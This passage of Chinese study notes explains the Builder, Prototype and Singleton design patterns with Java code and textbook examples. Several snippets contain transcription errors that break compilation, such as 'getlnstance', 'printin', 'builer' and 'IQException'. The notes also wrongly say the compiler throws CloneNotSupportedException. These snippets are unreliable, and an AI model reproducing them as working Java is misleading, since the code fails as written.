class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>指挥者（Director）</p><p>指挥者又称为导演类，它负责安排复杂对象的建造次序，指挥者与抽象建造者之间存在关联关系，可以在其<code>construct()</code>建造方法中调用建造者对象的部件构造与装配方法，完成复杂对象的建造。客户端一般只需要与指挥者进行交互，在客户端确定具体建造者的类型，并实例化具体建造者对象（也可以通过配置文件和反射机制实现），然后通过指挥者类的构造函数或者Setter方法将该对象传入指挥者类中。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Director</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Builder builder;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Director</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.builder = builder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuilder</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.builder = builer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//产品构建与组装方法</span></span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">construct</span><span class="params">()</span> &#123;</span><br><span class="line">        builder.buildPartA();</span><br><span class="line">        builder.buildPartB();</span><br><span class="line">        builder.buildPartC();</span><br><span class="line">        <span class="keyword">return</span> builder.getResult();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在指挥者类中可以注入一个抽象建造者类型的对象，它提供了一个建造方法<code>construct()</code>, 在该方法中调用了 builder对象的构造部件的方法，最后返回一个产品对象。</p></li><li><p>客户端</p><p>对于客户端而言，只需要关心具体建造者的类型，无须关心产品对象的具体组装过程。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可通过配置文件实现</span></span><br><span class="line"><span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcreteBuilder1</span>(); </span><br><span class="line"><span class="type">Director</span> <span class="variable">director</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Director</span>(builder);</span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> director.construct();</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-4">应用实例</h3><blockquote><p>​某游戏软件公司决定开发一款基于角色扮演的多人在线网络游戏，玩家可以在游戏中扮演虚拟世界中的一个特定角色，角色根据不同的游戏情节和统计数据（例如力量、魔法、技能等）具有不同的能力，角色也会随着不断升级而拥有更加强大的能力。<br>​作为该游戏的一个重要组成部分，需要对游戏角色进行设计，而且随着该游戏的升级将不断增加新的角色。通过分析发现，游戏角色是一个复杂对象，它包含性别、面容等多个组成部分，不同类型的游戏角色，其性别、面容、服装、发型等外部特性都有所差异，例如“天使”拥有美丽的面容和披肩的长发，并身穿一袭白裙；而“恶魔”极其丑陋，留着光头并穿一件刺眼的黑衣。<br>​无论是何种造型的游戏角色，它的创建步骤都大同小异，都需要逐步创建其组成部分，再将各组成部分装配成一个完整的游戏角色。现使用建造者模式来实现游戏角色的创建。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231228144252912.png" alt="image-20231228144252912"></p><ul><li>指挥者：<code>ActorController</code></li><li>抽象建造者：<code>ActorBuilder</code></li><li>具体建造者：<code>HeroBuilder</code>、<code>AngelBuilder</code>、<code>DevilBuilder</code></li><li>复杂产品：<code>Actor</code></li></ul><h3 id="特点及使用环境-4">特点及使用环境</h3><h4 id="优点-4">优点</h4><ol><li>客户端不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象</li><li>每一个具体建造者都相对独立，与其他的具体建造者无关，因此可以很方便地替换具体建造者或增加新的具体建造者，扩展方便，符合开闭原则</li><li>可以更加精细地控制产品的创建过程</li></ol><h4 id="缺点-4">缺点</h4><ol><li>建造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，不适合使用建造者模式，因此其使用范围受到一定的限制</li><li>如果产品的内部变化复杂，可能会需要定义很多具体建造者类来实现这种变化，导致系统变得很庞大，增加了系统的理解难度和运行成本</li></ol><h4 id="适用环境-4">适用环境</h4><ol><li>需要生成的产品对象有复杂的内部结构，这些产品对象通常包含多个成员变量</li><li>需要生成的产品对象的属性相互依赖，需要指定其生成顺序</li><li>对象的创建过程独立于创建该对象的类。在建造者模式中通过引入了指挥者类，将创建过程封装在指挥者类中，而不在建造者类和客户类中</li><li>隔离复杂对象的创建和使用，并使得相同的创建过程可以创建不同的产品</li></ol><h2 id="原型模式★-Prototype">原型模式★(Prototype)</h2><div class="tip "><p><strong>定义</strong>：</p><p>使用原型实例指定待创建对象的类型，并且通过复制这个原型来创建新的对象</p></div><h3 id="模式结构-5">模式结构</h3><h4 id="结构图-5">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228144922896.png" alt="image-20231228144922896"></p><h4 id="实现代码-5">实现代码</h4><ul><li><p>抽象原型类（Prototype）</p><p>它是声明克隆方法的接口，是所有具体原型类的公共父类，它可以是抽象类也可以是接口，甚至还可以是具体实现类。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Prototype</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Prototype <span class="title function_">clone</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcretePrototype</span> <span class="keyword">extends</span> <span class="title class_">Prototype</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String attr;  <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAttr</span><span class="params">(String attr)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.attr = attr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAttr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.attr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//克隆方法</span></span><br><span class="line">    <span class="keyword">public</span> Prototype <span class="title function_">clone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Prototype</span> <span class="variable">prototype</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcretePrototype</span>(); <span class="comment">//创建新对象</span></span><br><span class="line">        prototype.setAttr(<span class="built_in">this</span>.attr);</span><br><span class="line">        <span class="keyword">return</span> prototype;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体原型类（ConcretePrototype）</p><p>它实现在抽象原型类中声明的克隆方法，在克隆方法中返回自己的一个克隆对象。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcretePrototype</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Prototype <span class="title function_">clone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            object = <span class="built_in">super</span>.clone(); <span class="comment">//浅克隆</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (CloneNotSupportedException exception) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Not support cloneable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (Prototype) object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端</p><p>在客户类中，让一个原型对象克隆自身从而创建一个新的对象，只需要直接实例化或通过工厂方法等方式创建一个原型对象，再通过调用该对象的克隆方法即可得到多个相同的对象。由于客户类针对抽象原型类Prototype编程，因此用户可以根据需要选择具体原型类，系统具有较好的可扩展性，增加或更换具体原型类都很方便。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prototype</span> <span class="variable">protptype</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcretePrototype</span>();</span><br><span class="line"><span class="type">Prototype</span> <span class="variable">copy</span> <span class="operator">=</span> protptype.clone();</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-5">应用实例</h3><blockquote><p>​在使用某OA系统时，有些岗位的员工发现他们每周的工作都大同小异，因此在填写工作周报时很多内容都是重复的，为了提高工作周报的创建效率，大家迫切希望有一种机制能够快速创建相同或者相似的周报，包括创建周报的附件。</p><p>​试使用原型模式对该OA系统中的工作周报创建模块进行改进。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231228170138649.png" alt="image-20231228170138649"></p><ul><li>抽象原型类：<code>Object</code></li><li>具体原型类：<code>WeeklyLog</code></li><li>成员类：<code>Attachment</code></li></ul><h3 id="模式变化-3">模式变化</h3><h3 id="通用实现（浅克隆）">通用实现（浅克隆）</h3><ul><li><p>通用的克隆实现方法是在具体原型类的克隆方法中实例化一个与自身类型相同的对象并将其返回，同时将相关的参数传入新创建的对象中，保证它们的成员变量相同。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Prototype</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Prototype <span class="title function_">clone</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcretePrototype</span> <span class="keyword">extends</span> <span class="title class_">Prototype</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String attr; <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAttr</span><span class="params">(String attr)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.attr = attr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAttr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.attr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//克隆方法</span></span><br><span class="line">    <span class="keyword">public</span> Prototype <span class="title function_">clone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//创建新对象</span></span><br><span class="line">        <span class="type">Prototype</span> <span class="variable">prototype</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcretePrototype</span>(); </span><br><span class="line">        prototype.setAttr(<span class="built_in">this</span>.attr);</span><br><span class="line">        <span class="keyword">return</span> prototype;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConcretePrototype</span> <span class="variable">prototype</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcretePrototype</span>();</span><br><span class="line">prototype.setAttr(<span class="string">&quot;Sunny&quot;</span>);</span><br><span class="line"><span class="type">ConcretePrototype</span> <span class="variable">copy</span> <span class="operator">=</span> (ConcretePrototype)prototype.clone();</span><br></pre></td></tr></table></figure></li></ul><h4 id="通过Cloneable实现的浅克隆">通过Cloneable实现的浅克隆</h4><ul><li><p>所有的Java类均继承自java.lang.Object类，Object类提供了一个<code>clone()</code>方法，可以将一个Java对象复制一份。因此在Java中可以直接使用Object提供的 <code>clone()</code>方法来实现对象的浅克隆。</p></li><li><p>能够实现克隆的Java类必须实现一个标识接口 Cloneable，表示这个Java类支持被复制。如果一个类没有实现这个接口但是调用了 <code>clone()</code>方法，Java编译器将抛出一个CloneNotSupportedException异常。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcretePrototype</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Prototype <span class="title function_">clone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            object = <span class="built_in">super</span>. clone(); <span class="comment">//浅克隆</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (CloneNotSupportedException exception) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Not support cloneable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (Prototype) object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prototype</span> <span class="variable">protptype</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcretePrototype</span>();</span><br><span class="line"><span class="type">Prototype</span> <span class="variable">copy</span> <span class="operator">=</span> protptype.clone();</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>Java语言中的<code>clone()</code>方法满足以下几点：</p><ol><li>对任何对象x，都有<code>x.clone()!=x</code>，即克隆对象与原型对象不是同一个对象</li><li>对任何对象x，都有<code>x.clone().getClass() == x.getClass()</code>，即克隆对象与原型对象的类型一样</li><li>如果对象x的<code>equals()</code>的方法定义恰当，那么<code>x.clone().equals(x)</code>应该成立。</li></ol><p>为了获取对象的一个克隆，可以直接利用Object类的<code>clone()</code>方法，具体步骤如下：</p><ol><li>在派生类中覆盖基类的<code>clone()</code>方法，并声明为public</li><li>在派生类的<code>clone()</code>方法中调用<code>super.clone()</code></li><li>派生类需实现Cloneable接口。</li></ol><p>此时，Object类相当于抽象原型类，所有实现了Cloneable接口的类相当于具体原型类。</p></blockquote><h4 id="通过序列化实现深克隆">通过序列化实现深克隆</h4><ul><li><p>为了能够在复制周报的同时也能够复制附件对象，需要采用深克隆机制。在Java语言中可以通过序列化（Serialization）等方式来实现深克隆。序列化就是将对象写到流的过程，写到流中的对象是原有对象的一个复制，而原对象仍然存在于内存中。通过序列化实现的复制不仅可以复制对象本身，而且可以复制其引用的成员对象，因此通过序列化将对象写到一个流中，再从流里将其读出来，可以实现深克隆。需要注意的是能够实现序列化的对象其类必须实现Serializable接口，否则无法实现序列化操作。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用序列化技术实现深克隆</span></span><br><span class="line"><span class="keyword">public</span> WeeklyLog <span class="title function_">deepClone</span><span class="params">()</span> <span class="keyword">throws</span> IQException, ClassNotFoundException, OptionalDataException &#123;</span><br><span class="line">    <span class="comment">//将对象写入流中</span></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(); </span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">    oos.writeObject(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//将对象从流中取出</span></span><br><span class="line">    <span class="type">ByteArrayInputstream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStrearn</span>(bao.toByteArray());</span><br><span class="line">    <span class="type">Objectinputstream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">    <span class="keyword">return</span> (WeeklyLog)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="特点及使用环境-5">特点及使用环境</h3><h4 id="优点-5">优点</h4><ol><li>简化对象的创建过程，通过复制一个已有实例可以提高新实例的创建效率</li><li>扩展性较好</li><li>提供了简化的创建结构，原型模式中产品的复制是通过封装在原型类中的克隆方法实现的，无须专门的工厂类来创建产品</li><li>可以使用深克隆的方式保存对象的状态，以便在需要的时候使用，可辅助实现撤销操作</li></ol><h4 id="缺点-5">缺点</h4><ol><li>需要为每一个类配备一个克隆方法，而且该克隆方法位于一个类的内部，当对已有的类进行改造时，需要修改源代码，违背了开闭原则</li><li>在实现深克隆时需要编写较为复杂的代码，而且当对象之间存在多重的嵌套引用时，为了实现深克隆，每一层对象对应的类都必须支持深克隆，实现起来可能会比较麻烦</li></ol><h4 id="适用环境-5">适用环境</h4><ol><li>创建新对象成本较大，新对象可以通过复制已有对象来获得，如果是相似对象，则可以对其成员变量稍作修改</li><li>系统要保存对象的状态，而对象的状态变化很小</li><li>需要避免使用分层次的工厂类来创建分层次的对象</li></ol><h2 id="单例模式-Singleton">单例模式(Singleton)</h2><div class="tip "><p><strong>定义</strong>：</p><p>确保一个类只有一个实例，并提供一个全局访问点来访问这个唯一实例</p></div><h3 id="模式结构-6">模式结构</h3><h4 id="结构图-6">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228174602624.png" alt="image-20231228174602624"></p><h4 id="实现代码-6">实现代码</h4><ul><li><p>单例（Singleton）</p><p>在单例类的内部创建它的唯一实例，并通过静态方法<code>getlnstance()</code>让客户端可以使用它的唯一实例；为了防止在外部对单例类实例化，将其构造函数的可见性设为private；在单例类内部定义了一个Singleton类型的静态对象作为供外部共享访问的唯一实例。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="comment">//静态私有成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>; </span><br><span class="line">    <span class="comment">//私有构造函数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态公有工厂方法，返回唯一实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">s1</span> <span class="operator">=</span> Singleton.getlnstance();</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">s2</span> <span class="operator">=</span> Singleton.getlnstance();</span><br><span class="line">        <span class="comment">//判断两个对象是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (sl == s2) &#123;</span><br><span class="line">            System.out.printin(<span class="string">&quot;两个对象是相同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.printin(<span class="string">&quot;两个对象是不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-6">应用实例</h3><blockquote><p>​某软件公司承接了一个服务器负载均衡(Load Balance)软件的开发工作，该软件运行在一台负载均衡服务器上，可以将并发访问和数据流量分发到服务器集群中的多台设备上进行并发处理，提高了系统的整体处理能力，缩短了响应时间。由于集群中的服务器需要动态删减，且客户端请求需要统一分发，因此需要确保负载均衡器的唯一性，只能有一个负载均衡器来负责服务器的管理和请求的分发，否则将会带来服务器状态的不一致以及请求分配冲突等问题。如何确保负载均衡器的唯一性是该软件成功的关键，试使用单例模式设计服务器负载均衡器。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231228175207480.png" alt="image-20231228175207480"></p><ul><li>单例：<code>LoadBalancer</code></li></ul><h3 id="模式变化-4">模式变化</h3><h4 id="饿汉式单例">饿汉式单例</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228175330686.png" alt="image-20231228175330686"></p><ul><li><p>当类被加载时，静态变量instance会被初始化，此时类的私有构造函数会被调用，单例类的唯一实例将被创建。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EagerSingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">EagerSingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EagerSingleton</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">EagerSingleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> EagerSingleton <span class="title function_">getlnstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="懒汉式单例">懒汉式单例</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228180547275.png" alt="image-20231228180547275"></p><ul><li><p>懒汉式单例在第一次调用<code>getlnstance()</code>方法时实例化，在类加载时并不自行实例化，这种技术又称为延迟加载(Lazy Load)技术，即需要的时候再加载实例。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123; &#125;</span><br><span class="line">    <span class="comment">//使用synchronized关键字对方法加锁，确保任意时刻只有一个线程可执行该方法</span></span><br><span class="line">    <span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance = = <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在上述懒汉式单例类中，在<code>getlnstance()</code>方法前面增加了关键字synchronized进行线程锁定，以处理多个线程同时访问的问题。上述代码虽然解决了线程安全问题，但是每次调用<code>getlnstance()</code>时都需要进行线程锁定判断，在多线程高并发访问环境中将会导致系统性能大大降低。</p></li><li><p>假如在某一瞬间线程A和线程B都在调用<code>getlnstance()</code>方法，此时instance对象为null值，均能通过<code>instance==null</code>的判断。由于实现了synchronized加锁机制，线程A进入synchronized锁定的代码中执行实例创建代码，线程B处于排队等待状态，必须等待线程A执行完毕后才可以进入synchronized锁定的代码。但当A执行完毕时线程B并不知道实例已经创建，将继续创建新的实例，导致产生多个单例对象，违背了单例模式的设计思想，因此需要进一步改进，在synchronized中再进行一次<code>instance==null</code>判断，这种方式称为双重检查锁定（Double-Check Locking）。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LazySingleton <span class="title function_">getlnstance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//第一重判断</span></span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//锁定代码块</span></span><br><span class="line">        <span class="keyword">synchronized</span>(LazySingleton.class) &#123;</span><br><span class="line">            <span class="comment">//第二重判断</span></span><br><span class="line">            <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//创建单例实例</span></span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>(); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="特点及使用环境-6">特点及使用环境</h3><h4 id="优点-6">优点</h4><ol><li>提供了对唯一实例的受控访问</li><li>可以节约系统资源，提高系统的性能</li><li>允许可变数目的实例（多例类）</li></ol><h4 id="缺点-6">缺点</h4><ol><li>扩展困难（缺少抽象层）</li><li>单例类的职责过重</li><li>由于自动垃圾回收机制，可能会导致共享的单例对象的状态丢失</li></ol><h4 id="适用环境-6">适用环境</h4><ol><li>系统只需要一个实例对象，或者因为资源消耗太大而只允许创建一个对象</li><li>客户调用类的单个实例只允许使用一个公共访问点，除了该公共访问点，不能通过其他途径访问该实例</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux简单操作速查</title>
      <link href="/posts/f31ac9c6.html"/>
      <url>/posts/f31ac9c6.html</url>
      
